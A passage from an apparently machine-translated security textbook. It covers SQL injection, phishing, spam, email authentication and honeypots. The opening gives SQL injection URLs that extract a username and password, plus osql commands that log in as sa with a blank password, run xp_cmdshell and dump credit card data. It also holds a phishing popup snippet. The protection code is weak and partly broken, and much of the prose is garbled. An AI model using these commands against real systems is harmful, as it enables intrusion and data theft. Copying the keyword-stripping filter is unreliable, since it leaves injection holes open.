Microsoft OLE DB Provider for ODBC Drivers error '80040e07 ' [Microsoft] [ODBC SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value 'passwd ' to a column of data type int. /Index.asp, line 5

Presumably, passwd-column must contain all passwords. The last step gets the user name and password:

http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 login_name FROM logintable--

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07 ' [Microsoft] [ODBC SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value 'Rahul ' to a column of data type int. /Index.asp, line 5

Next query:

http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 password FROM logintable where login_name = 'Rahul ' -

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07 ' [Microsoft] [ODBC SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value 'P455w0rd ' to a column of data type int. /Index.asp, line 5

Username = Rahul and Password = P455wOrd. We cracked the database of www.nosecurity.com.

4.  > Function Call Injection: Is a process in which any database function is triggered by suitable commands. These function calls can be directed to the underlying system or to manipulate data in the database. For example, let's look at MS-SQL 2000 with many supporting procedures:

sp password: change password¨ sp tables: shows all tables in the database

XP cmdshell: allows executing any command on the server with admin rights¨.

XP msver: shows SQL version and all information of running operating system.

XP regdeletekey: delete a key in Windows registry.

xp regdeletevalue: delete a registry value.

XP regread: Print a value in registry.

XP regwrite: Assign a new value to a key.

xp terminate process: terminate a process.

In MS-SQL, a defaulted account exits user = sa without password (pass = ") . Many Web server drivers forget to delete this account. Use osql.exe here (also works with telnet, Netcat ..) to connect to the webserver.

C:> osql.exe -?

osql: unknown option?

usage: osql [-U login id] [-P password]

[-S server] [-H hostname] [-E trusted connection]

[-d use database name] [-l login timeout] [-t query timeout]

[-h headers] [-s colseparator] [-w columnwidth] [-a packetize] [-e echo input] [-I Enable Quoted Identifier] [-L list server] [-c cmdend]

[-q "cmdline query"] [-Q "cmdline query" and exit] [-n remove numbering] [-m errorlevel] [-r msgs to stderr] [-V severitylevel]

[-i inputfile] [-o outputfile]

[-p print statistics] [-b On error batch abort]

[-O use old ISQL behavior disables the following]

<EOF> batch processing

Auto console width scaling

Wide messages

default error level is -1 vs 1

[-? show syntax summary]

C: \> osql.exe -S 198.188.178.1 -U sa -P ""

If we get something like this:

1>

It means that the connection is successful. Otherwise, an error message appears for user = sa . Now it is possible to run any command with XP cmdshell on the server: ¨

C: \> osql.exe -S 198.188.178.1 -U sa -P "" -Q "exec master.dbo.

xp_cmdshell 'dir> dir.txt ' "

C: \> osql.exe -S 198.188.178.1 -U sa -P "" -Q "select * from information_schema.tables"

C: \> osql.exe -S 198.188.178.1 -U sa -P "" -Q "select username, creditcard, expdate from users"

SQL injection gaps can be found in many web application systems. According to http://www.acunetix.de/websitesecurity/sql-injection.htm, about 50 percent of websites worldwide were susceptible to SQL injection. Fortunately, there are also some good countermeasures Web server drivers to protect against SQL injection.

Protection

Similar to the protection method against XSS, perform a strike input validation on all client inputs, removing all sensitive characters for SQL from inputs such as ',;, -, select, union, insert, XP, or escapes so that the attacker no longer sends an SQL command to the database. Here you can reuse the PHP script in XSS protection :

function filter ($ input) {

$ input = ereg_replace (" '", "", $ input);

$ input = ereg_replace (";", "", $ input);

$ input = ereg_replace ("-", "", $ input);

$ input = ereg_replace ("select", "", $ input);

$ input = ereg_replace ("union", "", $ input);

$ input = ereg_replace ("insert", "", $ input);

$ input = ereg_replace ("xp_", "", $ input);

return $ input; }

An example with PHP function mysql real escape string () to escape the client input:

$ query = "SELECT column1 FROM table WHERE

column2 = '".mysql_real_escape_string ($ _ POST [ ' column2value '])." $ query = mysql_query ($ query) or die ("Database query failed!");

Implement standard error handling. This includes a generated error for all errors so that the attacker can no longer exploit the database error message.

Forget such Default System Account (as in SQL Server 2000). Remove all functions like XP cmdshell, XP grantlogin if they are not really necessary.

> Chapter 6 – Phishing

What is Phishing?

Phishing is an automated identity theft. This sends the fake emails to recipients trying to trick that recipient into sharing their private information such as credit card numbers or password bank accounts. Most of all, emails sent to a fake website make them enter private data. In order to gain confidence, this website must be similar to the original site that the Phishers imitate. The word phishing is obviously a variation of 'password fishing ' , in that the phishers put the 'hook ' out with the hope that a few victims will bite it.

Functioning and Phishing Method

Although the general idea for Phishing is to inflict the victims on the fake side, there are several techniques that make the idea a reality. The three best-known methods are now presented: Impersonation, Forwarding, and Popups.

> ·  Impersonation: is the simplest and most popular phishing method [LiVi02], with which is a fully crafted fake¨ page for victims to visit. The fake website contains images from the real website, which do not necessarily have to be copied to the phishing server but simply backed up from the original website. If the victim types his/her data into the input field and clicks Submit, that data will be sent to phishers in the input field through the Script Handling script. An important part of the method is to write the phishing email with a link to the fake page. Such an email looks like the underlying mail: The language in the email of the key victim is to attack. The fake page should be the same as the original page, so you can not immediately tell that they are different. For example:

Original: http://www.securitybank.com/bank/cgi/show?id=45

Fake: ¨ http://www.securitybank.net/bank/service/show?prameters=1

> ·  Forwarding: is a phishing technique that uses an email to get the private data and then leads the victim to the real website. This phishing style is popular with eBay, PayPal, Amazon ... often emailing their customers to share benefits and new services. With this technique, the login field (or specific input field) will be embedded in the email. When victims type in their data and click Submit, they are taken to the real page, but their data is sent to Phishers. Such emails look like the ones from below: The login script is actually similar to Impersonation Script, just after sending victim data to phishers, the login script will take you to the real website. Victims are more easily cheated with this technique because the fake URL is not displayed. It is difficult to discover that the HTML email comes from another website.

> ·  Popup Attack: is a technique by opening a pop-up window for the phishing server during the redirection of the victim to the real web page. HTML code for the pop-up window is easily made as below:

<BODY bgColor = # ffffff

onload = "window.open ( 'phish.html ', 'popup ', 'top = 150, left = 250, width = 250, height = 200, toolbar = no, location = no, scrollbars = no, resizable = yes ' ) "> </ BODY>

If victims follow the link in the email, the fake page becomes the real one right away. The page is redirected and opens a pop-up window with input fields into which all typed input will be sent to the phisher. However, this technique is rarely seen today because pop-up blockers are used in most browsers.

Protection

Since the phishing emails always contain HTML representation and the forwarding technique still script, by turning off HTML presentation and script of the email program who disable the fake HTML, links, and scripts. All emails are then displayed with plain text to protect against phishing.

Use a phishing protection system that compares e-mail headers with the latest phis-her-list of lyrics and reviews the links, whether or not they are really displayed. Never open emails sent by unknown sources. Install an anti-spam system to filter spams.

> Chapter 7 – Spam

With the rapid spread of the Internet and the proliferation of e-mail in the business and personal realm, sending unwanted bulk e-mail, commonly known as spam, has also become a massive problem. This seminar paper shows which basic features of the e-mail system enable the sending of spam and how senders do it. Furthermore, various methods are presented to prevent the sending of spam messages and efforts to solve the problems of the present e-mail system.

Definition

The most widely used international term for spam is Unsolicited Bulk E-mail " (UBE) —to German unwanted or unsolicited bulk e-mails. In addition to e-mail spam, there are also spam in other media such as instant messaging systems, commentary spam in gas books and weblogs and telephone spam through automated calls with tape announcements. This work focuses exclusively on e-mail spam in the sense of UBE.

The term spam derives originally from the spammed product SPAM – Spiced Pork And Meat/Ham " from Hormel Foods Corporation. The product, which has been available since 1936, was taken up in 1970 in a sketch of the English comedy series " Monty Pythons ' Flying Circus ", which appears as part of every dish on a menu and is loudly supported by a group of singing Vikings. [Merr04], [Pyth70] The word appears more than 132 times in the sketch, which explains the association with e-mail spam.

Introduction

While spam messages were just a few years ago, using e-mail today is virtually impossible without massive anti-spam measures.

Although the problem of unwanted e-mail messages was already recognized in 1975 by Postel [Post75] and 1982 by Denning [Denn82], in practice, it did not matter at that time. Sending messages to thousands of newsgroups on April 12, 1994, promoting a green card lottery was the first major commercial spam news story [Camp94]. In 1997, the spam problem was also recognized on the official site: the US Trade Commission dealt with this issue and set up a working group for combating corruption [Comm97]. In the past few years, spam shipments have risen sharply and accounted for approximately 80-85% of e-mail traffic by the end of 2005 [Grou96].

Unfortunately, despite much progress in spam-fighting, the following statement by Bill Gates has not been confirmed:

"Two years from now, spam wants to be solved. I promise a spam-free world by 2006."

(Microsoft CEO Bill Gates, Jan 2004)

Types

Spam messages can be divided into different categories. [Lab06], [Mars]

> ·  Adult spam, such as the promotion of potency increasing drugs, pornographic offers or dating services

> ·  Financial offers, such as loans, advertising for shares to influence the price or alleged profits in lotteries

> ·  False messages intended to obtain authentication information for online services.

With the emergence of spam filters, senders are trying to get the actual content of the

Disguise messages. This ranges from simple text changes like V14gra or \ / | 4grA up to the dispatch of pictures, PDF and audio files since these are more difficult to analyze.

Bounces (see Section 2.5) are not spamming messages per se, but they occur as a result of undeliverable messages with faked sender details. This information about the failed delivery to the supposed sender is sometimes harder today than the spam itself since there are few countermeasures.

Damage

A large amount of spam that is being sent today causes additional network traffic, computational effort, memory requirements, and working hours, both by e-mail users and administrators.

Table 1 shows by means of a sample calculation which enormous damage is caused by spam and how few recipients have to react to a spam message so that the sender makes a profit.

Origin

According to statistics from the Spamhaus project [Proj07], most of the spam is sent from the US. The US is followed by China, Russia, the United Kingdom, and fifth place in Germany.

> Chapter 8 – Functionality of the Email System

Sending spam is closely related to how the e-mail system works. This will be explained below.

SMTP

The current e-mail system is based on the SMTP standard specified in 1982 [Post82] and updated in 2001 by ESMTP [Klen01]. He is like the internet itself – decentralized and specifies the transmission of e-mail messages from one server to another. The servicing service on the server is called a mail transfer agent (MTA) and is responsible for accepting and processing the messages. If he receives a message addressed to a recipient within his own domain, he places it in the mailbox of the corresponding user. Otherwise, he sends it via SMTP to the appropriate e-mail server, which he determines via the DNS. Listing 1 shows message transmission via SMTP.

Listing 1: SMTP Dialog

220 s omehost. net ESMTP Exim 4\. 6 3 # 1 Mon, 26 Nov 2 0 0 7 2 3: 1 0: 2 1 +0100 HELO anotherhost. net     

250somehost. net Hello localhost [1 2 7\. 0\. 0\. 1 ]

MAIL FROM: Bill  < bill @ Microsoft.com >

250OK

RCPT TO Richard @ somehost.net

250Accepted

250 accepts    

DATA

354 Entermessage, endingwith ". "On aline by itself From Steve < steve @ Microsoft.com > To: Richard@somehost. net

Subject: L i nux v iolates our IP                                                      

Hello, nothing unusual to say,

250 OK id = 1IwmAg - 0008ED - LA QUIT    

221 somehost.net closing connection

Shipping

In the early days of the Internet, e-mails for delivery were simply handed over to the local MTA, which was a standard feature of the then-popular UNIX systems. Nowadays, the e-mail client (also known as the mail user agent, MUA) usually sends outgoing e-mails to the e-mail server of the provider, which then makes the further transmission. It also uses the SMTP protocol, but in the enhanced version ESMTP, which allows password authentication. This use of the SMTP protocol for two different applications - end-user message submission ( " submission ") and email transfer between MTAs ( " transfer ") - makes the configuration of MTAs complicated and error-prone. Therefore, with the Message Submission specification [GeKl98], there is a suggestion to separate message persistence by the end-user by using a different TCP port and some protocol extensions.

Relaying

Relaying refers to the acceptance and forwarding of messages via SMTP. In the past, it was customary for MTAs to accept arbitrary messages and pass them on if necessary. This configuration is called Open Relay. As it is later implemented, this encourages the sending of spam, so that this practice has largely been abandoned. Nowadays, MTAs usually only accept e-mails addressed to their own domain, unless the sender authenticates with a password.

The transmission of messages to third-party servers plays a role in failover security. If an e-mail server can not be reached, the message can be forwarded to a " mail exchanger " (MX, specified in the DNS), which caches it and delivers it if the responsible server is available again.

Authenticity of Messages

An email is technically just a piece of text, consisting of a header (Header) and a message part (Body). The header contains meta-information such as sender, receiver, transmission time, and operator. The message part contains the message itself.

However, the header only serves as additional information for the recipient. When sending via the SMTP protocol, the sender and recipient are specified explicitly. This information is known as Envelope Information and is not visible to the recipient of the message. They may differ from the information in the message header. (See also Listing 1) Thus, the envelope information includes all e-mail addresses to which the message is actually sent. In the header, on the other hand, some of these addresses may be in the " to " field (receiver), others in the " CC " field (copy) and not at all (blind copy, BCC).

The header information can, therefore, contain any values, in particular, incorrect sender addresses. Also, the envelope details are generally not checked during shipping. In particular, a verification of the sender address by the receiving server is not possible, since the SMTP standard does not prescribe which servers should be allowed to send e-mails for a domain. The authenticity of e-mail messages is therefore not guaranteed by the e-mail system.

Delivery Error

In principle, an MTA is responsible for a message, if it has accepted it. If he can not deliver a message, he sends back a bounce message to the sender stating the reasons for the failed delivery. For example, possible reasons may be that the mailbox on the destination host does not exist or is full. If it is a temporary error, such as the destination host is unreachable, it tries to deliver the message in the long term.

> Chapter 9 – Causes

In the following, different causes are pointed out, which favor the dispatch of spam or make it possible in the first place.

Low Shipping Costs

The shipping costs for spam are very low, as only a computer within an internet connection is necessary. This makes the sending of spam messages only attractive since due to the low shipping costs only a very small proportion of the recipient must respond to the message in order to make a profit.

Open Relays

Open relays make it easy to send messages in bulk, as spammers have to send messages with very many recipients only once, and the open relay then handles the further transmission. In addition, open relays enable spammers to send spam messages, even if their own addresses have already been included in blacklists. Open relays may also involuntarily result from incorrect configuration of the MTA.

Zombie Computers

Zombie computers are computer systems used by internet users, who were brought under foreign control by a Trojan horse and form so-called botnets in large numbers. (see other seminar paper). These are often misused for spamming without the knowledge of the owners. Symantec security software company monitored over 5 million bot-infected computers over a 6-month period. [Corp07] In addition to sending messages directly through SMTP, some trojans also try to exclude credentials to the email provider's server and use them to send messages after authentication.

Authenticity Not Verifiable

Since the authenticity of a message and the correctness of the sender's information cannot be checked without further technical measures, such as electronic signatures, a distinction between spam and regular messages is difficult. The fact that spam e-mails have to be sorted out and deleted manually is the main cause of the costs incurred by the recipient.

No Uniform Handling Against Spammers

Due to the international nature of the Internet and the lack of a uniform legal basis, there is no uniform approach against spammers. While some countries now have anti-spam laws in place, others have no legal basis for persecuting spammers.

Shipping

Since one or more servers can always be located on the basis of their IP address and can be taken off the net by public authorities, the transmission of spam messages is usually carried out by external computers. While the former was often open relay, today it is almost exclusively botnets, the merger of many zombie computers.

Another way that spam is sent is the misuse of e-mail forms on web pages (e-mail injection). Spammers try to inject additional headers and in the worst case can send emails of any content to any recipient. [Brau05]

> Chapter 10 – Spam, Phishing: Countermeasures

Countermeasures can be subdivided into actions that work within the existing system and actions that try to remedy the weaknesses of the email system. In order to avoid interference with the desired email traffic, it makes sense to use the listed procedures with whitelists of regular communication partners to exclude messages from them. The pre-set methods are often used on the email server, but some can also be implemented in the email clients.

Treatment of Spam

Many of the following methods attempt to distinguish spam messages from legitimate emails. This section explains how to handle spam-classified messages.

Reject

The disadvantage of rejecting messages classified as spam is that they do not burden the email system and the end-user. The downside is that misclassified messages do not reach the recipient. There are two ways to do this:

> ·  Accepting the message and later bugging and creating a bounce message: The advantage is that it is technically easier to first accept the message and then later spam classification. However, because the bounce messages are sent to the, in most cases, fake, sender addresses, this method leads to massive loading of the uninvolved and is therefore unsuitable.

> ·  Rejecting the message during the SMTP dialog (see Listing 2): This method requires spam checking during transmission by the broadcaster and is therefore technically more demanding. Direct rejection can also cause the email address to be removed from the list of spammers, as they obviously cannot be delivered to them. If it is a legitimate message, the sender learns of the problem that sending MTA that was refused acceptance generates a bounce message.

Delete

Silently deleting messages has the same benefit as rejecting messages. However, if it is a legitimate message, the sender must assume that the message has been successfully delivered while the recipient never receives it. That's why quietly dropping messages in practice does not make sense, especially since, in addition to the technically simpler implementation, it offers no advantages over rejecting the SMTP time.

Mark

The most common approach is to mark the message in question and move it to its own spam folder so that the recipient can check the classification and then delete the messages. This has the advantage that misclassified messages still arrive at the receiver. In practice, however, the problem arises that a lot of spam messages are received and the user often empties the spam folder without looking through the messages. Then the effect is the same as silent deletion, i.e., worse than rejecting messages.

Often several procedures are combined. Thus, in a classification method that has little false-positives, messages can be rejected directly and only flagged in less-explicit methods. This combines the advantages of both approaches.

Measures within the System

This section introduces some anti-spam measures that can be used within the existing email system.

Blacklists

Blacklists are scanned or queried upon receipt of a message for the IP address of the sender. The most common types are blacklists from servers that have sent spam in the past, often open relays. There are also blacklists of servers that violate the SMTP standard and lists of dial-up addresses. Blacklists of spam-sending servers are commonly used to reject messages from these servers directly. This, in turn, puts pressure on server operators to control the delivery of messages through their servers.

The use of blacklists is very effective and generally has a low false-positive rate. However, there are always traps in which blacklist operators overshoot targets. Thus since August 05, all .de domains are listed in the list of the operator RFC-Ignorant.org.

Entries to these blacklists can be made either manually or automatically, for example through honeypots.

Greylisting

Greylisting is a weak form of blacklisting. An email is rejected by a previously unknown sender at the first delivery attempt and cached in the greylist, but accepted in a second later attempt and the sender is saved as known. The method is based on the SMTP standard to re-deliver an email at ever-increasing intervals when the destination host reports a temporary error. Sending spam messages often saves this second attempt. The price is a late delivery of the first news of a new communication partner, but the process is very effective. On its own servers, the author has observed that less than 1/3 of the news on the greylist was delivered again. Usually, the process is combined with a whitelist of email servers from large providers who do not adhere to the SMTP standard or use changing servers in the delivery attempts.

Hashlists

In addition to blacklists, there are also lists that store hashes of spam messages themselves. For a large mass of subscribers submitting spam messages, "new" spam messages are delivered promptly and can be treated appropriately by email servers requesting this list. An example is the " distributed checksum clearinghouse " (DCC, [Soft]).

Spam filter

Spam filters classify messages based on their content, often using a combination of rating criteria:

> ·  Frequently, a fixed set of rules is used that contains weighted labels that often appear in spam messages, such as excessive use of capital letters, a high ratio of images to text, or disguised names of potential enhancers. By combining a great many rules, the recognition rate is quite good, but the rules must always be kept up to date since spam senders deliberately protect their messages against detection by the well-known spam filters.

> ·  Learning methods, such as Bayesian Filter [AKCP + 00], are based on user feedback. In doing so, the user transfers incorrectly classified messages - both false positive (ham) and unrecognized spam - back to the filter, which gradually adapts itself. Bayesian ratings can be stored either in a general or personal database. The great advantage of this method is that, unlike fixed rules, it adapts to the individual email traffic of an organization or individual.

> ·  Use of other methods presented here, such as blacklists, hash lists, SPF entries, or DKIM signatures.

The result of the classification is often a value indicating the likelihood that the message is spam. From a certain threshold, the message can be marked and then moved to another folder or rejected directly if the value is particularly high.

Virus Scanner

Virus scanners detect viruses contained in messages based on signatures. Given a legitimate update, the detection rate of viruses is very high, and the false-positive rate is very low.

System Improvement Measures

The following anti-spam measures try to fix the problems of the existing email system.

No Shipping Via Dial-Up Addresses

Shipments through hijacked computers can be compromised by email servers not accepting emails directly from dial-up addresses. These can be identified by blacklists. Users of these addresses must then send emails via the server of their email provider, usually with a password. This countermeasure is largely implemented. The sending with the password (SMTP-AUTH) is supported by all email providers¨ and many servers are running.

This measure also means that the operation of a private email server on the home Internet connection is no longer easily possible.

Sender Verification

In order to prevent the specification of arbitrary sender addresses and thus to ensure the authenticity of messages, several methods have been developed which make it possible to determine which email servers to send emails for a domain.

The Sender Policy Framework (SPF) specifies in a special DNS record which hosts can send emails for that domain and also send messages from other hosts. These entries can be queried and checked by the receiving email server. Based on the result, the message can be a violation of a strict claim. A successful review can be weaker in the review by a spam filter. The method allows for a gradual introduction and benefits if it is not yet used by all email providers. One drawback is that additional efforts have to be made to ensure that the forwarding of messages, e.g., in the case of mailing lists or private forwarding, can function as before.

The following SPF entry specifies that only the server is allowed to send emails for the domain somehost.net pointed to by the DNS record of that domain.

Listing 4: Example of an SPF entry

somehost. net. 3 6 0 0 IN TXT "v = spf 1 a  - all "                                                                  

The DKIM [ACDL + 07] method uses public-key cryptography. The message, including header, is signed with a private key by the operator of the email service who has authenticated the sender by password and can be opened and verified with a public key. The public key is usually provided via a DNS record. The procedure also supports the publicizing of a policy, whether a domain must be signed for all sent emails, and thus allows - as SPD - the direct rejection of messages that violate this policy. In addition, the signature of the message text can ensure that the message has not been changed since the signature. The process is already being used by Gmail, Yahoo, and some others. Similar methods are Sender ID and DomainKeys, the forerunner of DKIM.

Listing 5: Example of a DKIM signature in the email header. The header details Sender, Recipient, Betre, and Date were signed.

DKIM - Signature: a = rsa - sha 1; q = dns;                          

d = example. com;

i = user @ eng. example. com;

s = jun 2 0 0 5\. tight; c = relaxed / simple;            

t = 1 1 1 7 5 7 4 9 3 8; x = 1 1 1 8 0 0 6 9 3 8;

h = from: to: subject: date;

b = dzdVyOfAKCdLXdJOc9G2q8LoXSlEniSb av + yuU4zGeeruD00lszZVoG4ZHRNiYzR

Delivery Charges

There are ideas to solve the problem of cheap email delivery. The sale should become more expensive either through the payment of very small amounts or the solving of arithmetic tasks. The introduction of a real-money payment system seems unlikely, as it would require a central authority that all users of the email system must recognize. Even the solving of computational tasks is not used yet. In both cases, the problem arises that in addition to spam, many legitimate messages, such as newsletters, are sent in large numbers, and these methods are not reasonable for the sender of the messages. In addition, a gradual introduction of the procedures is not possible.

> Chapter 11 – Legislation

USA

In the US, the CAN-SPAM Act (Controlling the Assault of Non-Solicited Pornography and Marketing Act of 2003, [Cong03]) came into force in December 2003 and resulted in a series of convictions, including prison sentences.

Europe

In the EU, the term for spam is " unsolicited commercial email" (UCE) and thus excludes non-commercial spam messages. On October 31, 2003, an EU directive came into effect on data protection in force [Unio02] which stipulates that email advertising may only be sent with the prior consent of the addressee, provided that it does not serve to maintain an existing customer relationship. It also prohibits prefixed "sender" and "illegal" addresses as spammers use them frequently. However, the directive is not itself a law, but must first be transposed into concrete laws by the Member States. In Germany, this was done by the Telemediengesetz (TMG) of 2007\. It provides for fines of up to EUR 50,000 for sending spam messages. However, spam is also explicitly mentioned in the " Law against Unfair Competition " (UGW), updated on April 1, 2004\. However, this only provides the recipient with a legal handle through the detour of consumer protection associations.

Unlike in the US, spam is treated in Germany only in civil law but not in criminal law.

Judgments

The following judgments illustrate the difference between the extra criminal prosecution in the US and civil law in Europe.

> ·  USA, November 2004: Jeremy Jaynes is sentenced to 9 years in prison under Virginia law. [Brie06]

> ·  USA, September 2006: Daniel Lin is being fined $ 10,000 and imprisoned for three years under the CAN-SPAM Act. [Kuri04]

> ·  The Netherlands, early 2007: A Dutchman is fined € 75,000 for sending spam messages. [Kuri07]

Outlook

By combating open relays and sending emails from dial-up addresses using blacklists, email has been put in a more orderly manner in recent years. More advanced technical countermeasures have been countered with clever tricks from spam senders, but have nonetheless led to a decrease in the burden on the end-user. However, new standards, such as the DKIM signature procedure, which is becoming more and more widespread, suggesting that the elimination of the weaknesses of the on-the-counter email system will drastically make spam shipping more difficult in the future.

> Chapter 12 – Honeypots

This work is about the concept of honeypots. In the process, I will first discuss what honeypots are about and try to find an appropriate definition. Afterward, I will explain which services Honeypots can provide and which not. In this context, the first distinction among the different types of honeypots is introduced. Then I explained how their development went on. The third section will then deal with the classification of honeypots into classes and the characteristics of each class. After that, I will highlight the pros and cons of using honeypots and then describe some examples of honeypots in more detail.

When the Internet was put into operation for the first time around 1970, one had no idea what development it would take. But with the introduction of the Internet, people have been able to find unexpected possibilities. Today, life without the Internet is unimaginable. You can communicate with people from all over the world, exchange data, and much more. Due to the enormous growth of the Internet, new technologies are being tried and developed over and over again to expand the application spectrum of this medium. In the meantime, the simple communication medium internet has become a platform on which both private and business networks are developing. Nowadays, in addition to private communication such as in chat rooms or via email, business transactions such as bank transfers or online orders, as well as proper online registration and deregistration are made possible.

But the Internet also carries many dangers. The gigantic growth is accompanied by an ever-increasing number of attacks on the huge data streams on the Internet. Therefore, the need for data protection has grown significantly. Here a real race between the attackers and the security experts of the Internet has developed. The attackers are always trying to find new ways and means to access important data, which security experts counteract with the development of protective mechanisms. Nevertheless, there are always new approaches, and therefore, it is enormously important to research new safety technologies in the future as well. An important aid here is honeypots. That is why I will deal with these in the following.

What Are Honeypots? – Definition of a Honeypot

Before the properties of the honeypots are explained in the following sections, first of all, a suitable definition of a honeypot has to be found in order to know exactly what honeypots are and what they can do. Systemically, honeypots are systems that act as bait for attackers. Within the network, they do not provide meaningful services and are therefore not addressed directly from within the system, so any attempt to contact them will result in an attacker not knowing the system configuration. The search for a clear definition is not easy, because there are a lot of them. The reason why there are so many different definitions is that honeypots can be applied to many different types of Internet applications. Unlike many other security techniques on the Internet, they are not geared to a particular problem but try to cover the widest possible range of bandwidth. For example, a firewall is designed to prevent attackers from accessing a system. In contrast, honeypots try to detect not only unauthorized system access but also Trojans, worms, and other attacks. In doing so, a honeypot only collects relevant data that is directly related to the attack on the computer and evaluates it if necessary. Thus, a honeypot deals with relatively few but highly relevant data in terms of attack and its methodology, while other programs such as firewalls and antivirus programs are dealing with a huge flood of data as they continuously control the entire data stream to match it with known patterns or to monitor the access permissions of all programs to the system resources. A good and, in my opinion, very good definition can be found in the book " Honeypots Tracking Hackers " by Lance Spitzner. There, a honeypot is defined as follows:

A honeypot is a security resource whose value is to be attacked or compromised

And this is precisely the difference between honeypots and other security techniques. One wants to have an attack on a honeypot to learn something new about the attack and the attacker himself. There are a number of possible uses of Honeypots. For example, they can detect and analyze a worm attack, or they can recognize and point out unauthorized system access at an early stage. As different as the possible uses of an application are so different are the honeypots themselves.

You can roughly differentiate between two types of honeypots. There are production and research honeypots. Production honeypots are mainly used in companies and in the private sector. With this honeypot type, attacks can usually only be determined. However, this also has the advantage that these honeypots are much easier to handle. On the contrary, the research honeypots, as the name implies, are used for research purposes. With honeypots of this type, attacks are not only detected, but also much information about the attack and its attacker is collected and evaluated. This is to gain new insights into the methods and tools of attackers. These are then used to develop new security techniques to protect systems in the future better.

Honeypots are much more complex and difficult to use than the production honeypots. In addition to the type distinction of honeypots, one can classify all honeypots. There are a total of three different classes, low-, medium- and high-interaction honeypots. Classification takes place depending on how many interaction possibilities an attacker has with a honeypot. A more detailed explanation of each class will be given in a later section.

History of Honeypots

After the definition and first introduction to honeypots, it will now be time to take a look at the genesis. The idea of a honeypot is already a bit longer. However, the concept of honeypots was not yet known under its current name. Only recently has the concept of honeypots really prevailed.

In 1990, two different publications were made on this topic. The first was a book by Clifford Stoll entitled "The Cuckoo 's Egg." Clifford Stoll was working with computer systems at that time and found that an attacker had resorted to the data of this system. But instead of suppressing this grief, he decided to let the attacker go on and observe him instead. This gave him the opportunity to gather much information about him. The system on which Stoll watched the attacker was not yet a honeypot in the current sense. It was instead a real system with sensitive data. However, with this book, the first approaches and ideas of today's honeypots are well recognized. While the attached system cannot be described as a honeypot, since it was not specifically intended to collect information about the attack, the basic idea behind the intruder's observation was the same.

The second release this year came from Bill Cheswick. This was a paper titled "An Evening with Berferd in Which a Cracker Is Lured, Endured, and Studied." The difference to Stoll 's book was that they had a system specially designed to be attacked. So this was a honeypot by definition, even if Cheswick did not call it that. The document describes how the system was created and what its properties were. As in Stoll 's book, Cheswick also describes how an attacker tried to access his system and what he could learn from it.

The next most important date in the history of honeypots is the year 1997\. That year saw the release of the first program to install and use a honeypot on his own private computer. It was called Deception Toolkit (DTK) and was written by Fred Cohen. The program for operating a honey-pot was primarily intended to collect information about the attackers' activities and to confuse them.

In the following year, as an extension to DTK, another Honeypot product called CyberCop Sting was developed. When used, CyberCop Sting offered the user two important new features. The first one was that the program did not run on Unix but on Windows NT. The second and much more important difference was that CyberCop Sting could run many parallel systems of various kinds. For example, it was possible to replicate Cisco, Solaris, and NT applications at the same time. This greatly increased the chance of attack. Despite all the benefits and ease of use of this product, it has never really been successful in the marketplace.

In 1998, a program called NetFacade was developed by Marty Roesch. It was able to simulate up to seven different types of applications, allowing for up to 254 systems. Although the program was not very well known, it had a lot of benefits for the development of honeypots.

Back Officer Friendly was developed in the same year. This program, which will be further elaborated in a later section, was simple to use and, despite its limited functionality, allowed a wide audience to truly deal with the honeypot concept for the first time. Back Officer Friendly was free of charge and very easy to install. This allowed it to be downloaded and applied without much prior knowledge.

In 1999, finally, the Honeynet Project was founded. The team of this project, which consisted of volunteer security experts, focused on the use of honeynets. These too will be explained in a later section.

Due to the rapid increase in attacks by worms in the years since 2000, Honeypots have been used more and more, thanks to their good results, and have become increasingly accepted as a tool in the fight against attacks on the Internet.

Classification of Honeypots

In connection with the definition of a honeypot, the two types of honeypots have already been briefly introduced. These two types were the production and research honeypots. Above all, production honeypots are used to detect and indicate seizures so that, if necessary, they can be counteracted with the appropriate security techniques. Research honeypots, on the other hand, are not only used to detect attacks and counteract attacks but also to learn about the attackers and their methods. In addition, there are three more different categories in which honeypots can be classified. These are the low-interaction, the medium-interaction, and the high-interaction honeypots. The classification of the honeypots depends, as the name suggests, on the intensity of the interaction that can be done with a honeypot. By the classification of Honeypots, one also has the possibility to compare them among themselves. The comparison option also helps in deciding which type of honeypot to choose. However, one has to be clear about what to do with the honeypot. For example, if you want to detect and monitor only unauthorized over-grips on a system, then a honeypot with a low interaction is sufficient.

On the other hand, if one wants to know something about the methods of the attackers, one has to decide on a complex honeypot with high interactivity. However, when selecting the honeypot, it should be noted that the more opportunities for interaction with a honeypot, the greater the security risk. The different expressions and properties of the honeypot classes are described in more detail in the following sections.

Low Interaction Honeypots

Low-interaction honeypots are characterized by having a more restricted functionality. As a result, they also have the advantage of ease of use. For example, a honeypot of this class can be used to determine when a seizure occurred. In addition, one can determine the IP address and the port of the attacker and the target of the attack. However, low-interaction honeypots do not offer much more functionality. Therefore, the information one obtains about the attack and the attacker is rather small. Due to this "simplicity," the honeypots of this class are easy to install and above all, very easy to use. The user interface is usually over-the-top and easy to understand. Of course, the limited functionality of these honeypots also greatly restricts the interaction that a potential attacker may have with the system. This has the advantage that the security risk is very low since the attacker is given no opportunity to attack and take over important systems. The low-interaction honeypots are mainly used in private use.

Medium Interaction Honeypots

This honeypot class already has more functionality and thus offers an attacker more interaction possibilities with the honeypot. For this reason, one can collect and exploit more information about the attacker and his aggressor. The increased interaction level also makes handling and installation more difficult. This class of honeypots has its complexity between the low and the high-interaction honeypots. The disadvantage of the increased interaction, however, is that it also increases the security risk. The reason for this is that with the increase in the level of interaction, the attacker is " presented " with an almost real system. If the attacker hacks the honeypot, the system can be used to attack other systems. The advantage of this honeypot class, however, is that you can gather much more information about an attacker.

High-Interaction Honeypots

The high-interaction honeypots have the highest complexity and represent a real system with many real-world applications. This makes it possible to collect a great deal of information during a seizure. It not only gathers information about the timing of an attack but also provides information about the abilities of an attacker and their methods and procedures. As the security risk increases as the level of interaction increases, the security risk associated with this honeypot class is very high. The reason for this is that an attacker who has invaded a honeypot of this class can attack other systems and cause immense damage. It takes a lot of prior knowledge to operate such a honeypot, as both the installation and the operation are much more complex than in the other classes. This type of honeypot is mainly used as a research honeypot.

Now that some "honeypots" have been clarified, it is time to address the real "pros and cons." Such consideration will be given below.

Benefits of Honeypots

